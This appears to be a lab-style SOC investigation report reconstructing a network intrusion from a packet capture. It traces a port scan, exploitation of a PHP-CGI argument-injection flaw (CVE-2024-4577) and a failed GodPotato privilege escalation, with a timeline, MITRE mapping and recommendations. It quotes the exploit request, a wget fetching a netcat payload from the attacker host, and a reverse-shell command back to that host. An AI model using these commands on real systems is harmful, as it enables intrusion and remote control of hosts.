# 🧩 Packet Puzzle — SOC Investigation Report

## 📌 Overview

Suspicious internal network activity was detected at a cryptocurrency trading company. A packet capture was exported for analysis to determine whether the environment was compromised and to reconstruct attacker actions.

This investigation confirms successful exploitation of a vulnerable web service, remote command execution, payload delivery, and an attempted privilege escalation.

**Case Type:** Network Intrusion Investigation
**Data Source:** PCAP
**Attacker IP:** 192.168.170.128
**Victim IP:** 192.168.170.130

---

## 🧠 Skills Demonstrated

* PCAP analysis
* Port-scan reconstruction
* Exploit identification
* Command reconstruction
* Payload tracking
* Timeline building
* MITRE mapping
* Incident reporting

---

## 🛠️ Tools Used

* Wireshark
* TCP Stream analysis
* HTTP reconstruction

---

## 🧭 Investigation Summary

* Attacker performed internal port scan
* 8 services identified as open
* PHP-CGI vulnerability exploited
* Remote command execution achieved
* Reverse shell downloaded
* Privilege escalation attempted using GodPotato
* Escalation failed

---

## 1️⃣ Reconnaissance

The attacker at **192.168.170.128** scanned the victim host **192.168.170.130**.

Findings:

* 8 open ports discovered
* First responding port: **22**

Evidence:
(Insert Screenshot 1 — port scan)

---

## 2️⃣ Exploitation

HTTP traffic shows exploitation of PHP-CGI argument injection.

Observed payload:

```
POST /?%ADd+allow_url_include=1+-d+auto_prepend_file=php://input
```

This confirms exploitation of:
**CVE-2024-4577**
Product: **PHP 8.1.25**

MITRE Technique:
**T1190 — Exploit Public-Facing Application**

Evidence:
(Insert Screenshot 2 — HTTP exploit request)

---

## 3️⃣ Initial Foothold

Attacker executed commands on the host via web shell.

Timestamp:
**2025-01-22 09:47:32**

Victim account identified:
**cristo**

Evidence:
(Insert Screenshot 3 — command execution)

---

## 4️⃣ Payload Download

Attacker downloaded a reverse shell payload.

Command observed:

```
wget http://192.168.170.128:9696/nc64.exe -o time.exe
```

Then downloaded privilege escalation tool:

```
iwr https://github.com/.../GodPotato-NET4.exe -Outfile TimeProvider.exe
```

Evidence:
(Insert Screenshot 4 — payload download)

---

## 5️⃣ Privilege Escalation Attempt

Attacker executed:

```
./TimeProvider.exe -cmd "time.exe 192.168.170.128 5555 -e cmd"
```

Tool used:
**GodPotato-NET4.exe**

Goal:
Escalate privileges to SYSTEM.

Evidence:
(Insert Screenshot 5 — privilege escalation command)

---

## 6️⃣ Escalation Failure

The attempt failed with error:

```
Cannot create process Win32Error:2
```

Evidence:
(Insert Screenshot 6 — error output)

---

## ⏱️ Timeline

| Time     | Event                     |
| -------- | ------------------------- |
| 09:45:27 | Port scan begins          |
| 09:46:09 | PHP exploit sent          |
| 09:47:32 | Initial foothold achieved |
| 09:48:00 | Payload downloaded        |
| 09:48:xx | Priv-esc attempted        |
| 09:48:xx | Priv-esc failed           |

---

## 📍 Indicators of Compromise

Attacker IP: 192.168.170.128
Victim IP: 192.168.170.130
User: cristo
Payload: GodPotato-NET4.exe
Reverse shell: nc64.exe

---

## 🗺️ MITRE ATT&CK Mapping

| Technique                 | ID    |
| ------------------------- | ----- |
| Exploit Public-Facing App | T1190 |
| Command Execution         | T1059 |
| Ingress Tool Transfer     | T1105 |
| Privilege Escalation      | T1068 |

---

## 🚨 Impact

* Remote code execution achieved
* Attacker gained shell access
* Privilege escalation attempted
* SYSTEM access attempt failed
* Host considered compromised

---

## 🛡️ Recommendations

* Patch PHP to fixed version
* Monitor internal scanning
* Restrict outbound downloads
* Implement EDR
* Block exploit patterns
* Enforce application allow-listing

---

## 🧾 Conclusion

The attacker exploited a vulnerable PHP service to gain remote code execution, downloaded tools for persistence and privilege escalation, and attempted to elevate privileges using GodPotato. Although the escalation failed, the host was fully compromised and required containment and remediation.
